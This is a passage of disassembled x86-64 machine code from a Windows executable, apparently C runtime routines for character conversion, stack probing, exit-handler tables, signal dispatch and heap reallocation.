   140009e71:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140009e76:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140009e7b:	48 83 c4 50          	add    $0x50,%rsp
   140009e7f:	41 5e                	pop    %r14
   140009e81:	c3                   	ret
   140009e82:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140009e87:	49 8b d1             	mov    %r9,%rdx
   140009e8a:	e8 ad b0 ff ff       	call   0x140004f3c
   140009e8f:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140009e94:	4c 39 b0 38 01 00 00 	cmp    %r14,0x138(%rax)
   140009e9b:	75 15                	jne    0x140009eb2
   140009e9d:	48 85 ff             	test   %rdi,%rdi
   140009ea0:	74 06                	je     0x140009ea8
   140009ea2:	0f b6 06             	movzbl (%rsi),%eax
   140009ea5:	66 89 07             	mov    %ax,(%rdi)
   140009ea8:	bb 01 00 00 00       	mov    $0x1,%ebx
   140009ead:	e9 ad 00 00 00       	jmp    0x140009f5f
   140009eb2:	0f b6 0e             	movzbl (%rsi),%ecx
   140009eb5:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140009eba:	e8 19 fb ff ff       	call   0x1400099d8
   140009ebf:	bb 01 00 00 00       	mov    $0x1,%ebx
   140009ec4:	85 c0                	test   %eax,%eax
   140009ec6:	74 5a                	je     0x140009f22
   140009ec8:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140009ecd:	44 8b 89 d4 00 00 00 	mov    0xd4(%rcx),%r9d
   140009ed4:	44 3b cb             	cmp    %ebx,%r9d
   140009ed7:	7e 2f                	jle    0x140009f08
   140009ed9:	41 3b e9             	cmp    %r9d,%ebp
   140009edc:	7c 2a                	jl     0x140009f08
   140009ede:	8b 49 04             	mov    0x4(%rcx),%ecx
   140009ee1:	41 8b c6             	mov    %r14d,%eax
   140009ee4:	48 85 ff             	test   %rdi,%rdi
   140009ee7:	0f 95 c0             	setne  %al
   140009eea:	8d 53 08             	lea    0x8(%rbx),%edx
   140009eed:	4c 8b c6             	mov    %rsi,%r8
   140009ef0:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140009ef4:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140009ef9:	ff 15 b1 72 00 00    	call   *0x72b1(%rip)        # 0x1400111b0
   140009eff:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140009f04:	85 c0                	test   %eax,%eax
   140009f06:	75 12                	jne    0x140009f1a
   140009f08:	48 63 81 d4 00 00 00 	movslq 0xd4(%rcx),%rax
   140009f0f:	48 3b e8             	cmp    %rax,%rbp
   140009f12:	72 3d                	jb     0x140009f51
   140009f14:	44 38 76 01          	cmp    %r14b,0x1(%rsi)
   140009f18:	74 37                	je     0x140009f51
   140009f1a:	8b 99 d4 00 00 00    	mov    0xd4(%rcx),%ebx
   140009f20:	eb 3d                	jmp    0x140009f5f
   140009f22:	41 8b c6             	mov    %r14d,%eax
   140009f25:	48 85 ff             	test   %rdi,%rdi
   140009f28:	44 8b cb             	mov    %ebx,%r9d
   140009f2b:	0f 95 c0             	setne  %al
   140009f2e:	4c 8b c6             	mov    %rsi,%r8
   140009f31:	ba 09 00 00 00       	mov    $0x9,%edx
   140009f36:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140009f3a:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140009f3f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140009f44:	8b 48 04             	mov    0x4(%rax),%ecx
   140009f47:	ff 15 63 72 00 00    	call   *0x7263(%rip)        # 0x1400111b0
   140009f4d:	85 c0                	test   %eax,%eax
   140009f4f:	75 0e                	jne    0x140009f5f
   140009f51:	e8 22 a6 ff ff       	call   0x140004578
   140009f56:	83 cb ff             	or     $0xffffffff,%ebx
   140009f59:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140009f5f:	44 38 74 24 48       	cmp    %r14b,0x48(%rsp)
   140009f64:	74 0c                	je     0x140009f72
   140009f66:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140009f6b:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140009f72:	8b c3                	mov    %ebx,%eax
   140009f74:	e9 ee fe ff ff       	jmp    0x140009e67
   140009f79:	cc                   	int3
   140009f7a:	cc                   	int3
   140009f7b:	cc                   	int3
   140009f7c:	45 33 c9             	xor    %r9d,%r9d
   140009f7f:	e9 a4 fe ff ff       	jmp    0x140009e28
   140009f84:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   140009f89:	48 83 ec 38          	sub    $0x38,%rsp
   140009f8d:	48 8b 0d e4 02 01 00 	mov    0x102e4(%rip),%rcx        # 0x14001a278
   140009f94:	48 83 f9 fe          	cmp    $0xfffffffffffffffe,%rcx
   140009f98:	75 0c                	jne    0x140009fa6
   140009f9a:	e8 dd 20 00 00       	call   0x14000c07c
   140009f9f:	48 8b 0d d2 02 01 00 	mov    0x102d2(%rip),%rcx        # 0x14001a278
   140009fa6:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140009faa:	75 07                	jne    0x140009fb3
   140009fac:	b8 ff ff 00 00       	mov    $0xffff,%eax
   140009fb1:	eb 25                	jmp    0x140009fd8
   140009fb3:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009fb9:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140009fbe:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140009fc3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140009fc9:	ff 15 61 72 00 00    	call   *0x7261(%rip)        # 0x140011230
   140009fcf:	85 c0                	test   %eax,%eax
   140009fd1:	74 d9                	je     0x140009fac
   140009fd3:	0f b7 44 24 40       	movzwl 0x40(%rsp),%eax
   140009fd8:	48 83 c4 38          	add    $0x38,%rsp
   140009fdc:	c3                   	ret
   140009fdd:	cc                   	int3
   140009fde:	cc                   	int3
   140009fdf:	cc                   	int3
   140009fe0:	cc                   	int3
   140009fe1:	cc                   	int3
   140009fe2:	cc                   	int3
   140009fe3:	cc                   	int3
   140009fe4:	cc                   	int3
   140009fe5:	cc                   	int3
   140009fe6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140009fed:	00 00 00 
   140009ff0:	48 83 ec 10          	sub    $0x10,%rsp
   140009ff4:	4c 89 14 24          	mov    %r10,(%rsp)
   140009ff8:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   140009ffd:	4d 33 db             	xor    %r11,%r11
   14000a000:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   14000a005:	4c 2b d0             	sub    %rax,%r10
   14000a008:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000a00c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   14000a013:	00 00 
   14000a015:	4d 3b d3             	cmp    %r11,%r10
   14000a018:	73 16                	jae    0x14000a030
   14000a01a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   14000a020:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   14000a027:	41 c6 03 00          	movb   $0x0,(%r11)
   14000a02b:	4d 3b d3             	cmp    %r11,%r10
   14000a02e:	75 f0                	jne    0x14000a020
   14000a030:	4c 8b 14 24          	mov    (%rsp),%r10
   14000a034:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   14000a039:	48 83 c4 10          	add    $0x10,%rsp
   14000a03d:	c3                   	ret
   14000a03e:	cc                   	int3
   14000a03f:	cc                   	int3
   14000a040:	40 53                	rex push %rbx
   14000a042:	48 83 ec 20          	sub    $0x20,%rsp
   14000a046:	ba 08 00 00 00       	mov    $0x8,%edx
   14000a04b:	8d 4a 18             	lea    0x18(%rdx),%ecx
   14000a04e:	e8 61 d2 ff ff       	call   0x1400072b4
   14000a053:	48 8b c8             	mov    %rax,%rcx
   14000a056:	48 8b d8             	mov    %rax,%rbx
   14000a059:	ff 15 21 70 00 00    	call   *0x7021(%rip)        # 0x140011080
   14000a05f:	48 89 05 ea 1b 01 00 	mov    %rax,0x11bea(%rip)        # 0x14001bc50
   14000a066:	48 89 05 db 1b 01 00 	mov    %rax,0x11bdb(%rip)        # 0x14001bc48
   14000a06d:	48 85 db             	test   %rbx,%rbx
   14000a070:	75 05                	jne    0x14000a077
   14000a072:	8d 43 18             	lea    0x18(%rbx),%eax
   14000a075:	eb 06                	jmp    0x14000a07d
   14000a077:	48 83 23 00          	andq   $0x0,(%rbx)
   14000a07b:	33 c0                	xor    %eax,%eax
   14000a07d:	48 83 c4 20          	add    $0x20,%rsp
   14000a081:	5b                   	pop    %rbx
   14000a082:	c3                   	ret
   14000a083:	cc                   	int3
   14000a084:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a089:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000a08e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000a093:	41 54                	push   %r12
   14000a095:	41 56                	push   %r14
   14000a097:	41 57                	push   %r15
   14000a099:	48 83 ec 20          	sub    $0x20,%rsp
   14000a09d:	4c 8b e1             	mov    %rcx,%r12
   14000a0a0:	e8 53 d0 ff ff       	call   0x1400070f8
   14000a0a5:	90                   	nop
   14000a0a6:	48 8b 0d a3 1b 01 00 	mov    0x11ba3(%rip),%rcx        # 0x14001bc50
   14000a0ad:	ff 15 d5 6f 00 00    	call   *0x6fd5(%rip)        # 0x140011088
   14000a0b3:	4c 8b f0             	mov    %rax,%r14
   14000a0b6:	48 8b 0d 8b 1b 01 00 	mov    0x11b8b(%rip),%rcx        # 0x14001bc48
   14000a0bd:	ff 15 c5 6f 00 00    	call   *0x6fc5(%rip)        # 0x140011088
   14000a0c3:	48 8b d8             	mov    %rax,%rbx
   14000a0c6:	49 3b c6             	cmp    %r14,%rax
   14000a0c9:	0f 82 9b 00 00 00    	jb     0x14000a16a
   14000a0cf:	48 8b f8             	mov    %rax,%rdi
   14000a0d2:	49 2b fe             	sub    %r14,%rdi
   14000a0d5:	4c 8d 7f 08          	lea    0x8(%rdi),%r15
   14000a0d9:	49 83 ff 08          	cmp    $0x8,%r15
   14000a0dd:	0f 82 87 00 00 00    	jb     0x14000a16a
   14000a0e3:	49 8b ce             	mov    %r14,%rcx
   14000a0e6:	e8 cd 1f 00 00       	call   0x14000c0b8
   14000a0eb:	48 8b f0             	mov    %rax,%rsi
   14000a0ee:	49 3b c7             	cmp    %r15,%rax
   14000a0f1:	73 55                	jae    0x14000a148
   14000a0f3:	ba 00 10 00 00       	mov    $0x1000,%edx
   14000a0f8:	48 3b c2             	cmp    %rdx,%rax
   14000a0fb:	48 0f 42 d0          	cmovb  %rax,%rdx
   14000a0ff:	48 03 d0             	add    %rax,%rdx
   14000a102:	48 3b d0             	cmp    %rax,%rdx
   14000a105:	72 11                	jb     0x14000a118
   14000a107:	49 8b ce             	mov    %r14,%rcx
   14000a10a:	e8 a1 d2 ff ff       	call   0x1400073b0
   14000a10f:	33 db                	xor    %ebx,%ebx
   14000a111:	48 85 c0             	test   %rax,%rax
   14000a114:	75 1a                	jne    0x14000a130
   14000a116:	eb 02                	jmp    0x14000a11a
   14000a118:	33 db                	xor    %ebx,%ebx
   14000a11a:	48 8d 56 20          	lea    0x20(%rsi),%rdx
   14000a11e:	48 3b d6             	cmp    %rsi,%rdx
   14000a121:	72 49                	jb     0x14000a16c
   14000a123:	49 8b ce             	mov    %r14,%rcx
   14000a126:	e8 85 d2 ff ff       	call   0x1400073b0
   14000a12b:	48 85 c0             	test   %rax,%rax
   14000a12e:	74 3c                	je     0x14000a16c
   14000a130:	48 c1 ff 03          	sar    $0x3,%rdi
   14000a134:	48 8d 1c f8          	lea    (%rax,%rdi,8),%rbx
   14000a138:	48 8b c8             	mov    %rax,%rcx
   14000a13b:	ff 15 3f 6f 00 00    	call   *0x6f3f(%rip)        # 0x140011080
   14000a141:	48 89 05 08 1b 01 00 	mov    %rax,0x11b08(%rip)        # 0x14001bc50
   14000a148:	49 8b cc             	mov    %r12,%rcx
   14000a14b:	ff 15 2f 6f 00 00    	call   *0x6f2f(%rip)        # 0x140011080
   14000a151:	48 89 03             	mov    %rax,(%rbx)
   14000a154:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   14000a158:	ff 15 22 6f 00 00    	call   *0x6f22(%rip)        # 0x140011080
   14000a15e:	48 89 05 e3 1a 01 00 	mov    %rax,0x11ae3(%rip)        # 0x14001bc48
   14000a165:	49 8b dc             	mov    %r12,%rbx
   14000a168:	eb 02                	jmp    0x14000a16c
   14000a16a:	33 db                	xor    %ebx,%ebx
   14000a16c:	e8 93 cf ff ff       	call   0x140007104
   14000a171:	48 8b c3             	mov    %rbx,%rax
   14000a174:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000a179:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000a17e:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   14000a183:	48 83 c4 20          	add    $0x20,%rsp
   14000a187:	41 5f                	pop    %r15
   14000a189:	41 5e                	pop    %r14
   14000a18b:	41 5c                	pop    %r12
   14000a18d:	c3                   	ret
   14000a18e:	cc                   	int3
   14000a18f:	cc                   	int3
   14000a190:	48 83 ec 28          	sub    $0x28,%rsp
   14000a194:	e8 eb fe ff ff       	call   0x14000a084
   14000a199:	48 f7 d8             	neg    %rax
   14000a19c:	1b c0                	sbb    %eax,%eax
   14000a19e:	f7 d8                	neg    %eax
   14000a1a0:	ff c8                	dec    %eax
   14000a1a2:	48 83 c4 28          	add    $0x28,%rsp
   14000a1a6:	c3                   	ret
   14000a1a7:	cc                   	int3
   14000a1a8:	48 83 ec 28          	sub    $0x28,%rsp
   14000a1ac:	e8 07 ca ff ff       	call   0x140006bb8
   14000a1b1:	48 8b 88 d0 00 00 00 	mov    0xd0(%rax),%rcx
   14000a1b8:	48 85 c9             	test   %rcx,%rcx
   14000a1bb:	74 04                	je     0x14000a1c1
   14000a1bd:	ff d1                	call   *%rcx
   14000a1bf:	eb 00                	jmp    0x14000a1c1
   14000a1c1:	e8 2e 1f 00 00       	call   0x14000c0f4
   14000a1c6:	90                   	nop
   14000a1c7:	cc                   	int3
   14000a1c8:	48 83 ec 28          	sub    $0x28,%rsp
   14000a1cc:	48 8d 0d d5 ff ff ff 	lea    -0x2b(%rip),%rcx        # 0x14000a1a8
   14000a1d3:	ff 15 a7 6e 00 00    	call   *0x6ea7(%rip)        # 0x140011080
   14000a1d9:	48 89 05 68 19 01 00 	mov    %rax,0x11968(%rip)        # 0x14001bb48
   14000a1e0:	48 83 c4 28          	add    $0x28,%rsp
   14000a1e4:	c3                   	ret
   14000a1e5:	cc                   	int3
   14000a1e6:	cc                   	int3
   14000a1e7:	cc                   	int3
   14000a1e8:	48 89 0d 61 19 01 00 	mov    %rcx,0x11961(%rip)        # 0x14001bb50
   14000a1ef:	c3                   	ret
   14000a1f0:	48 8b 0d 71 19 01 00 	mov    0x11971(%rip),%rcx        # 0x14001bb68
   14000a1f7:	48 ff 25 8a 6e 00 00 	rex.W jmp *0x6e8a(%rip)        # 0x140011088
   14000a1fe:	cc                   	int3
   14000a1ff:	cc                   	int3
   14000a200:	48 89 0d 51 19 01 00 	mov    %rcx,0x11951(%rip)        # 0x14001bb58
   14000a207:	48 89 0d 52 19 01 00 	mov    %rcx,0x11952(%rip)        # 0x14001bb60
   14000a20e:	48 89 0d 53 19 01 00 	mov    %rcx,0x11953(%rip)        # 0x14001bb68
   14000a215:	48 89 0d 54 19 01 00 	mov    %rcx,0x11954(%rip)        # 0x14001bb70
   14000a21c:	c3                   	ret
   14000a21d:	cc                   	int3
   14000a21e:	cc                   	int3
   14000a21f:	cc                   	int3
   14000a220:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000a225:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000a22a:	57                   	push   %rdi
   14000a22b:	41 54                	push   %r12
   14000a22d:	41 55                	push   %r13
   14000a22f:	41 56                	push   %r14
   14000a231:	41 57                	push   %r15
   14000a233:	48 83 ec 30          	sub    $0x30,%rsp
   14000a237:	8b d9                	mov    %ecx,%ebx
   14000a239:	45 33 ed             	xor    %r13d,%r13d
   14000a23c:	44 21 6c 24 68       	and    %r13d,0x68(%rsp)
   14000a241:	33 ff                	xor    %edi,%edi
   14000a243:	89 7c 24 60          	mov    %edi,0x60(%rsp)
   14000a247:	33 f6                	xor    %esi,%esi
   14000a249:	8b d1                	mov    %ecx,%edx
   14000a24b:	83 ea 02             	sub    $0x2,%edx
   14000a24e:	0f 84 c4 00 00 00    	je     0x14000a318
   14000a254:	83 ea 02             	sub    $0x2,%edx
   14000a257:	74 62                	je     0x14000a2bb
   14000a259:	83 ea 02             	sub    $0x2,%edx
   14000a25c:	74 4d                	je     0x14000a2ab
   14000a25e:	83 ea 02             	sub    $0x2,%edx
   14000a261:	74 58                	je     0x14000a2bb
   14000a263:	83 ea 03             	sub    $0x3,%edx
   14000a266:	74 53                	je     0x14000a2bb
   14000a268:	83 ea 04             	sub    $0x4,%edx
   14000a26b:	74 2e                	je     0x14000a29b
   14000a26d:	83 ea 06             	sub    $0x6,%edx
   14000a270:	74 16                	je     0x14000a288
   14000a272:	ff ca                	dec    %edx
   14000a274:	74 35                	je     0x14000a2ab
   14000a276:	e8 fd a2 ff ff       	call   0x140004578
   14000a27b:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a281:	e8 a2 9e ff ff       	call   0x140004128
   14000a286:	eb 40                	jmp    0x14000a2c8
   14000a288:	4c 8d 35 d1 18 01 00 	lea    0x118d1(%rip),%r14        # 0x14001bb60
   14000a28f:	48 8b 0d ca 18 01 00 	mov    0x118ca(%rip),%rcx        # 0x14001bb60
   14000a296:	e9 8b 00 00 00       	jmp    0x14000a326
   14000a29b:	4c 8d 35 ce 18 01 00 	lea    0x118ce(%rip),%r14        # 0x14001bb70
   14000a2a2:	48 8b 0d c7 18 01 00 	mov    0x118c7(%rip),%rcx        # 0x14001bb70
   14000a2a9:	eb 7b                	jmp    0x14000a326
   14000a2ab:	4c 8d 35 b6 18 01 00 	lea    0x118b6(%rip),%r14        # 0x14001bb68
   14000a2b2:	48 8b 0d af 18 01 00 	mov    0x118af(%rip),%rcx        # 0x14001bb68
   14000a2b9:	eb 6b                	jmp    0x14000a326
   14000a2bb:	e8 1c c9 ff ff       	call   0x140006bdc
   14000a2c0:	48 8b f0             	mov    %rax,%rsi
   14000a2c3:	48 85 c0             	test   %rax,%rax
   14000a2c6:	75 08                	jne    0x14000a2d0
   14000a2c8:	83 c8 ff             	or     $0xffffffff,%eax
   14000a2cb:	e9 6b 01 00 00       	jmp    0x14000a43b
   14000a2d0:	48 8b 90 a0 00 00 00 	mov    0xa0(%rax),%rdx
   14000a2d7:	48 8b ca             	mov    %rdx,%rcx
   14000a2da:	4c 63 05 ef 77 00 00 	movslq 0x77ef(%rip),%r8        # 0x140011ad0
   14000a2e1:	39 59 04             	cmp    %ebx,0x4(%rcx)
   14000a2e4:	74 13                	je     0x14000a2f9
   14000a2e6:	48 83 c1 10          	add    $0x10,%rcx
   14000a2ea:	49 8b c0             	mov    %r8,%rax
   14000a2ed:	48 c1 e0 04          	shl    $0x4,%rax
   14000a2f1:	48 03 c2             	add    %rdx,%rax
   14000a2f4:	48 3b c8             	cmp    %rax,%rcx
   14000a2f7:	72 e8                	jb     0x14000a2e1
   14000a2f9:	49 8b c0             	mov    %r8,%rax
   14000a2fc:	48 c1 e0 04          	shl    $0x4,%rax
   14000a300:	48 03 c2             	add    %rdx,%rax
   14000a303:	48 3b c8             	cmp    %rax,%rcx
   14000a306:	73 05                	jae    0x14000a30d
   14000a308:	39 59 04             	cmp    %ebx,0x4(%rcx)
   14000a30b:	74 02                	je     0x14000a30f
   14000a30d:	33 c9                	xor    %ecx,%ecx
   14000a30f:	4c 8d 71 08          	lea    0x8(%rcx),%r14
   14000a313:	4d 8b 3e             	mov    (%r14),%r15
   14000a316:	eb 20                	jmp    0x14000a338
   14000a318:	4c 8d 35 39 18 01 00 	lea    0x11839(%rip),%r14        # 0x14001bb58
   14000a31f:	48 8b 0d 32 18 01 00 	mov    0x11832(%rip),%rcx        # 0x14001bb58
   14000a326:	bf 01 00 00 00       	mov    $0x1,%edi
   14000a32b:	89 7c 24 60          	mov    %edi,0x60(%rsp)
   14000a32f:	ff 15 53 6d 00 00    	call   *0x6d53(%rip)        # 0x140011088
   14000a335:	4c 8b f8             	mov    %rax,%r15
   14000a338:	49 83 ff 01          	cmp    $0x1,%r15
   14000a33c:	75 07                	jne    0x14000a345
   14000a33e:	33 c0                	xor    %eax,%eax
   14000a340:	e9 f6 00 00 00       	jmp    0x14000a43b
   14000a345:	4d 85 ff             	test   %r15,%r15
   14000a348:	75 0a                	jne    0x14000a354
   14000a34a:	41 8d 4f 03          	lea    0x3(%r15),%ecx
   14000a34e:	e8 b1 cc ff ff       	call   0x140007004
   14000a353:	cc                   	int3
   14000a354:	85 ff                	test   %edi,%edi
   14000a356:	74 08                	je     0x14000a360
   14000a358:	33 c9                	xor    %ecx,%ecx
   14000a35a:	e8 51 db ff ff       	call   0x140007eb0
   14000a35f:	90                   	nop
   14000a360:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   14000a366:	83 fb 0b             	cmp    $0xb,%ebx
   14000a369:	77 33                	ja     0x14000a39e
   14000a36b:	41 0f a3 dc          	bt     %ebx,%r12d
   14000a36f:	73 2d                	jae    0x14000a39e
   14000a371:	4c 8b ae a8 00 00 00 	mov    0xa8(%rsi),%r13
   14000a378:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   14000a37d:	48 83 a6 a8 00 00 00 	andq   $0x0,0xa8(%rsi)
   14000a384:	00 
   14000a385:	83 fb 08             	cmp    $0x8,%ebx
   14000a388:	75 52                	jne    0x14000a3dc
   14000a38a:	8b 86 b0 00 00 00    	mov    0xb0(%rsi),%eax
   14000a390:	89 44 24 68          	mov    %eax,0x68(%rsp)
   14000a394:	c7 86 b0 00 00 00 8c 	movl   $0x8c,0xb0(%rsi)
   14000a39b:	00 00 00 
   14000a39e:	83 fb 08             	cmp    $0x8,%ebx
   14000a3a1:	75 39                	jne    0x14000a3dc
   14000a3a3:	8b 0d 2f 77 00 00    	mov    0x772f(%rip),%ecx        # 0x140011ad8
   14000a3a9:	8b d1                	mov    %ecx,%edx
   14000a3ab:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   14000a3af:	8b 05 27 77 00 00    	mov    0x7727(%rip),%eax        # 0x140011adc
   14000a3b5:	03 c8                	add    %eax,%ecx
   14000a3b7:	3b d1                	cmp    %ecx,%edx
   14000a3b9:	7d 2c                	jge    0x14000a3e7
   14000a3bb:	48 63 ca             	movslq %edx,%rcx
   14000a3be:	48 03 c9             	add    %rcx,%rcx
   14000a3c1:	48 8b 86 a0 00 00 00 	mov    0xa0(%rsi),%rax
   14000a3c8:	48 83 64 c8 08 00    	andq   $0x0,0x8(%rax,%rcx,8)
   14000a3ce:	ff c2                	inc    %edx
   14000a3d0:	89 54 24 20          	mov    %edx,0x20(%rsp)
   14000a3d4:	8b 0d fe 76 00 00    	mov    0x76fe(%rip),%ecx        # 0x140011ad8
   14000a3da:	eb d3                	jmp    0x14000a3af
   14000a3dc:	33 c9                	xor    %ecx,%ecx
   14000a3de:	ff 15 9c 6c 00 00    	call   *0x6c9c(%rip)        # 0x140011080
   14000a3e4:	49 89 06             	mov    %rax,(%r14)
   14000a3e7:	85 ff                	test   %edi,%edi
   14000a3e9:	74 07                	je     0x14000a3f2
   14000a3eb:	33 c9                	xor    %ecx,%ecx
   14000a3ed:	e8 ae dc ff ff       	call   0x1400080a0
   14000a3f2:	83 fb 08             	cmp    $0x8,%ebx
   14000a3f5:	75 0d                	jne    0x14000a404
   14000a3f7:	8b 96 b0 00 00 00    	mov    0xb0(%rsi),%edx
   14000a3fd:	8b cb                	mov    %ebx,%ecx
   14000a3ff:	41 ff d7             	call   *%r15
   14000a402:	eb 05                	jmp    0x14000a409
   14000a404:	8b cb                	mov    %ebx,%ecx
   14000a406:	41 ff d7             	call   *%r15
   14000a409:	83 fb 0b             	cmp    $0xb,%ebx
   14000a40c:	0f 87 2c ff ff ff    	ja     0x14000a33e
   14000a412:	41 0f a3 dc          	bt     %ebx,%r12d
   14000a416:	0f 83 22 ff ff ff    	jae    0x14000a33e
   14000a41c:	4c 89 ae a8 00 00 00 	mov    %r13,0xa8(%rsi)
   14000a423:	83 fb 08             	cmp    $0x8,%ebx
   14000a426:	0f 85 12 ff ff ff    	jne    0x14000a33e
   14000a42c:	8b 44 24 68          	mov    0x68(%rsp),%eax
   14000a430:	89 86 b0 00 00 00    	mov    %eax,0xb0(%rsi)
   14000a436:	e9 03 ff ff ff       	jmp    0x14000a33e
   14000a43b:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000a440:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   14000a445:	48 83 c4 30          	add    $0x30,%rsp
   14000a449:	41 5f                	pop    %r15
   14000a44b:	41 5e                	pop    %r14
   14000a44d:	41 5d                	pop    %r13
   14000a44f:	41 5c                	pop    %r12
   14000a451:	5f                   	pop    %rdi
   14000a452:	c3                   	ret
   14000a453:	cc                   	int3
   14000a454:	48 89 0d 25 17 01 00 	mov    %rcx,0x11725(%rip)        # 0x14001bb80
   14000a45b:	c3                   	ret
   14000a45c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a461:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000a466:	57                   	push   %rdi
   14000a467:	48 83 ec 20          	sub    $0x20,%rsp
   14000a46b:	48 8b da             	mov    %rdx,%rbx
   14000a46e:	48 8b f9             	mov    %rcx,%rdi
   14000a471:	48 85 c9             	test   %rcx,%rcx
   14000a474:	75 0a                	jne    0x14000a480
   14000a476:	48 8b ca             	mov    %rdx,%rcx
   14000a479:	e8 ae 8f ff ff       	call   0x14000342c
   14000a47e:	eb 6a                	jmp    0x14000a4ea
   14000a480:	48 85 d2             	test   %rdx,%rdx
   14000a483:	75 07                	jne    0x14000a48c
   14000a485:	e8 0a 93 ff ff       	call   0x140003794
   14000a48a:	eb 5c                	jmp    0x14000a4e8
   14000a48c:	48 83 fa e0          	cmp    $0xffffffffffffffe0,%rdx
   14000a490:	77 43                	ja     0x14000a4d5
   14000a492:	48 8b 0d d7 0c 01 00 	mov    0x10cd7(%rip),%rcx        # 0x14001b170
   14000a499:	b8 01 00 00 00       	mov    $0x1,%eax
   14000a49e:	48 85 db             	test   %rbx,%rbx
   14000a4a1:	48 0f 44 d8          	cmove  %rax,%rbx
   14000a4a5:	4c 8b c7             	mov    %rdi,%r8
   14000a4a8:	33 d2                	xor    %edx,%edx
   14000a4aa:	4c 8b cb             	mov    %rbx,%r9
   14000a4ad:	ff 15 85 6d 00 00    	call   *0x6d85(%rip)        # 0x140011238
   14000a4b3:	48 8b f0             	mov    %rax,%rsi
   14000a4b6:	48 85 c0             	test   %rax,%rax
   14000a4b9:	75 6f                	jne    0x14000a52a
   14000a4bb:	39 05 0b 14 01 00    	cmp    %eax,0x1140b(%rip)        # 0x14001b8cc
   14000a4c1:	74 50                	je     0x14000a513
   14000a4c3:	48 8b cb             	mov    %rbx,%rcx
   14000a4c6:	e8 89 91 ff ff       	call   0x140003654
   14000a4cb:	85 c0                	test   %eax,%eax
   14000a4cd:	74 2b                	je     0x14000a4fa
   14000a4cf:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   14000a4d3:	76 bd                	jbe    0x14000a492
   14000a4d5:	48 8b cb             	mov    %rbx,%rcx
   14000a4d8:	e8 77 91 ff ff       	call   0x140003654
   14000a4dd:	e8 96 a0 ff ff       	call   0x140004578
   14000a4e2:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000a4e8:	33 c0                	xor    %eax,%eax
   14000a4ea:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a4ef:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000a4f4:	48 83 c4 20          	add    $0x20,%rsp
   14000a4f8:	5f                   	pop    %rdi
   14000a4f9:	c3                   	ret
   14000a4fa:	e8 79 a0 ff ff       	call   0x140004578
   14000a4ff:	48 8b d8             	mov    %rax,%rbx
   14000a502:	ff 15 88 6b 00 00    	call   *0x6b88(%rip)        # 0x140011090
   14000a508:	8b c8                	mov    %eax,%ecx
   14000a50a:	e8 89 a0 ff ff       	call   0x140004598
   14000a50f:	89 03                	mov    %eax,(%rbx)
   14000a511:	eb d5                	jmp    0x14000a4e8
   14000a513:	e8 60 a0 ff ff       	call   0x140004578
   14000a518:	48 8b d8             	mov    %rax,%rbx
   14000a51b:	ff 15 6f 6b 00 00    	call   *0x6b6f(%rip)        # 0x140011090
   14000a521:	8b c8                	mov    %eax,%ecx
   14000a523:	e8 70 a0 ff ff       	call   0x140004598
   14000a528:	89 03                	mov    %eax,(%rbx)
   14000a52a:	48 8b c6             	mov    %rsi,%rax
   14000a52d:	eb bb                	jmp    0x14000a4ea
   14000a52f:	cc                   	int3
   14000a530:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a535:	57                   	push   %rdi
   14000a536:	48 83 ec 20          	sub    $0x20,%rsp
   14000a53a:	49 8b f8             	mov    %r8,%rdi
   14000a53d:	48 8b da             	mov    %rdx,%rbx
   14000a540:	48 85 c9             	test   %rcx,%rcx
   14000a543:	74 1d                	je     0x14000a562
   14000a545:	33 d2                	xor    %edx,%edx
   14000a547:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   14000a54b:	48 f7 f1             	div    %rcx
